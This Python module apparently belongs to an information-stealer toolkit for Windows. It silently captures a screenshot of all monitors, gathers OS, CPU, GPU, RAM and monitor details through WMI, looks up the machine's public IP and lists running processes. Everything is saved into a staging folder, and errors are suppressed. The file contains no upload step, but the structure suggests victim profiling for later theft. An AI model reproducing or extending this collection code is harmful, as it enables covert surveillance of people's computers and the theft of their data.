from mss import mss
from os import mkdir
from win32com.client import GetObject
from win32api import EnumDisplayMonitors, GetMonitorInfo
from urllib.request import Request, urlopen

from ..utils.config import SystemConfig


class System:

    def __init__(self, *args):

        self.config = SystemConfig()

        for index, variable in enumerate(self.config.Variables):
            self.__dict__.update({variable: args[index]})

    def __create_folder(self):

        if any(self.statuses):
            mkdir(rf"{self.storage_path}\{self.storage_folder}\{self.folder}")

    def __create_screen(self):

        if self.statuses[0] is True:

            with mss() as screen:
                screen.shot(mon=-1, output=rf"{self.storage_path}\{self.storage_folder}\{self.folder}\Screenshot.png")

    def __get_system_info(self):

        if self.statuses[1] is True:

            win = GetObject("winmgmts:root\\cimv2")

            os_info = win.ExecQuery("Select * from Win32_OperatingSystem")[0]
            cpu_info = win.ExecQuery("Select * from Win32_Processor")[0].Name
            gpu_info = win.ExecQuery("Select * from Win32_VideoController")[0].Name
            monitors_info = ", ".join(f"{monitor['Device'][4:]} {monitor['Monitor'][2]}x{monitor['Monitor'][3]}" for monitor in [GetMonitorInfo(monitor[0]) for monitor in EnumDisplayMonitors()])

            try:
                net_info = urlopen(Request(method="GET", url=self.config.IPUrl)).read().decode("utf-8")
            except:
                net_info = "Error"

            info = (
                f"User: {self.config.User}\n",
                f"IP: {net_info}\n",
                f"OS Name: {os_info.Name.split('|')[0]}\n",
                f"OS Version: {os_info.Version} {os_info.BuildNumber}\n",
                f"Monitors: {monitors_info}\n"
                f"CPU: {cpu_info}\n",
                f"GPU: {gpu_info}\n",
                f"RAM: {round(float(os_info.TotalVisibleMemorySize) / 1048576)} GB\n",
            )

            with open(rf"{self.storage_path}\{self.storage_folder}\{self.folder}\Configuration.txt", "a", encoding="utf-8") as system:

                for item in info:
                    system.write(item)

            system.close()

    def __get_system_processes(self):

        if self.statuses[2] is True:

            with open(rf"{self.storage_path}\{self.storage_folder}\{self.folder}\Processes.txt", "a", encoding="utf-8") as processes:

                result = [process.Properties_('Name').Value for process in GetObject('winmgmts:').InstancesOf('Win32_Process')]
                processes.write("\n".join(process for process in result))

            processes.close()

    def run(self):

        try:

            self.__create_folder()
            self.__create_screen()
            self.__get_system_info()
            self.__get_system_processes()

        except Exception as e:
            if self.errors is True: print(f"[SYSTEM]: {repr(e)}")
